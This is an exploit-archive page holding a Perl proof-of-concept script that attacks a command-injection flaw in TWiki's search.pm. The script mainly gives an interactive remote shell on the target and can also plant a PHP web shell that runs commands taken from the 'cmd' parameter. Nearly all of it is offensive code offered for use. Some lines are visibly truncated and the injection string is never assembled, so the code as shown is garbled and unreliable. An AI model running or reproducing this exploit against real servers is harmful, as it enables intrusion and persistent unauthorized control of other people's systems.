TWiki 20030201 search.pm Remote Command Execution Exploit
=========================================================





#!/usr/bin/perl

# "tweaky.pl" v. 1.0 beta 2
#
# Proof of concept for TWiki vulnerability. Remote code execution
# Vuln discovered, researched and exploited by RoMaNSoFt <roman rs-labs com>
#
# Madrid, 30.Sep.2004.


require LWP::UserAgent;
use Getopt::Long;

### Default config
$host = &#039;&#039;;
$path = &#039;/cgi-bin/twiki/search/Main/&#039;;
$secure = 0;
$get = 0;
$post = 0;
$phpshellpath=&#039;&#039;;
$createphpshell = &#039;(echo `perl -e \&#039;print chr(60).chr(63)\&#039;` ; echo \&#039;$out = shell_exec($_GET["cmd"].
$logfile = &#039;&#039;; # If empty, logging will be disabled
$prompt = "tweaky\$ ";
$useragent = &#039;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)&#039;;
$proxy = &#039;&#039;;
$proxy_user = &#039;&#039;;
$proxy_pass = &#039;&#039;;
$basic_auth_user = &#039;&#039;;
$basic_auth_pass = &#039;&#039;;
$timeout = 30;
$debug = 0;
$init_command = &#039;uname -a ; id&#039;;
$start_mark = &#039;AAAA&#039;;
$end_mark = &#039;BBBB&#039;;
$post_string = &#039;) | sed \&#039;s/\(.*\)/&#039;.$start_mark.&#039;\1&#039;.$end_mark.&#039;.txt/\&#039; ; fgrep -i -l -- \&#039;nonexistantttt&#039;;
$delim_start = &#039;<b>&#039;.$start_mark;
$delim_end = $end_mark.&#039;</b>&#039;;

print "Proof of concept for TWiki vulnerability. Remote code execution.\n";
print "(c) RoMaNSoFt, 2004. <roman\@rs-labs.com>\n\n";

### User-supplied config (read from the command-line)
$parsing_ok = GetOptions (&#039;host=s&#039; => \$host,
&#039;path=s&#039; => \$path,
&#039;secure&#039; => \$secure,
&#039;get&#039; => \$get,
&#039;post&#039; => \$post,
&#039;phpshellpath=s&#039; => \$phpshellpath,
&#039;logfile=s&#039; => \$logfile,
&#039;init_command=s&#039; => \$init_command,
&#039;useragent=s&#039; => \$useragent,
&#039;proxy=s&#039; => \$proxy,
&#039;proxy_user=s&#039; => \$proxy_user,
&#039;proxy_pass=s&#039; => \$proxy_pass,
&#039;basic_auth_user=s&#039; => \$basic_auth_user,
&#039;basic_auth_pass=s&#039; => \$basic_auth_pass,
&#039;timeout=i&#039; => \$timeout,
&#039;debug&#039; => \$debug,
&#039;start_mark=s&#039; => \$start_mark,
&#039;end_mark=s&#039; => \$end_mark);

### Some basic checks
&banner unless ($parsing_ok);

if ($get and $post) {
print "Choose one only method! (GET or POST)\n\n";
&banner;
}

if (!($get or $post)) {
$post = 1;
}

if (!$host) {
print "You must specify a target hostname! (tip: --host <hostname>)\n\n" ;
&banner;
}

$url = ($secure ? &#039;https&#039; : &#039;http&#039;) . "://" . $host . $path;

### Checking for a vulnerable TWiki
&run_it ($init_command, &#039;RS-Labs rlz!&#039;);

### Execute selected payload

if ($phpshellpath) {
&create_phpshell;
print "PHPShell created.";
} else {
&pseudoshell;
}

### End
exit(0);


### Create PHPShell
sub create_phpshell {
$createphpshell .= $phpshellpath;
&run_it($createphpshell, &#039;yeah!&#039;);
}


### Pseudo-shell
sub pseudoshell {
open(LOGFILE, ">>$logfile") if $logfile;
open(STDINPUT, &#039;-&#039;);

print "Welcome to RoMaNSoFt&#039;s pseudo-interactive shell :-)\n[Type Ctrl-D or (bye, quit, exit, logout) to exit]\n
\n".$prompt.$init_command."\n";
&run_it ($init_command);
print $prompt;

while (<STDINPUT>) {
chop;
if ($_ eq "bye" or $_ eq "quit" or $_ eq "exit" or $_ eq "logout") {
exit(1);
}

&run_it ($_) unless !$_;
print "\n".$prompt;
}

close(STDINPUT);
close(LOGFILE) if $logfile;
}


### Print banner and die
sub banner {
print "Syntax: ./tweaky.pl --host=<host> [options]\n\n";
print "Proxy options: --proxy=http://proxy:port --proxy_user=foo --proxy_pass=bar\n";
print "Basic auth options: --basic_auth_user=foo --basic_auth_pass=bar\n";
print "Secure HTTP (HTTPS): --secure\n";
print "Path to CGI: --path=$path\n";
print "Method: --get | --post\n";
print "Enable logging: --logfile=/path/to/a/file\n";
print "Create PHPShell: --phpshellpath=/path/to/phpshell\n";

exit(1);
}


### Execute command via vulnerable CGI
sub run_it {
my ($command, $testing_vuln) = @_;
my $req;
my $ua = new LWP::UserAgent;

$ua->agent($useragent);
$ua->timeout($timeout);

# Build CGI param and urlencode it
$search =~ s/(\W)/"%" . unpack("H2", $1)/ge;

# Case GET
if ($get) {
$req = HTTP::Request->new(&#039;GET&#039;, $url . "?scope=text&order=modified&search=$search");
}

# Case POST
if ($post) {
$req = new HTTP::Request POST => $url;
$req->content_type(&#039;application/x-www-form-urlencoded&#039;);
$req->content("scope=text&order=modified&search=$search");
}

# Proxy definition
if ($proxy) {
if ($secure) {
# HTTPS request
$ENV{HTTPS_PROXY} = $proxy;
$ENV{HTTPS_PROXY_USERNAME} = $proxy_user;
$ENV{HTTPS_PROXY_PASSWORD} = $proxy_pass; 
} else {
# HTTP request
$ua->proxy([&#039;http&#039;] => $proxy);
$req->proxy_authorization_basic($proxy_user, $proxy_pass); 
}
}

# Basic Authorization
$req->authorization_basic($basic_auth_user, $basic_auth_pass) if ($basic_auth_user);

# Launch request and parse results
my $res = $ua->request($req);

if ($res->is_success) {

print LOGFILE "\n".$prompt.$command."\n" if ($logfile and !$testing_vuln);
@content = split("\n", $res->content);

my $empty_response = 1;

foreach $_ (@content) {
my ($match) = ($_ =~ /$delim_start(.*)$delim_end/g);

if ($debug) {
print $_ . "\n";
} else {
if ($match) {
$empty_response = 0;
print $match . "\n" unless ($testing_vuln);
}
}

print LOGFILE $match . "\n" if ($match and $logfile and !$testing_vuln);
}

if ($empty_response) {
if ($testing_vuln) {
die "Sorry, exploit didn&#039;t work!\nPerhaps TWiki is patched or you supplied a wrong URL 
(remember it should point to Twiki&#039;s search page).\n";
} else {
print "[Server issued an empty response. Perhaps you entered a wrong command?]\n";
}
}

} else {
die "Couldn&#039;t connect to server. Error message follows:\n" . $res->status_line . "\n";
} 
}



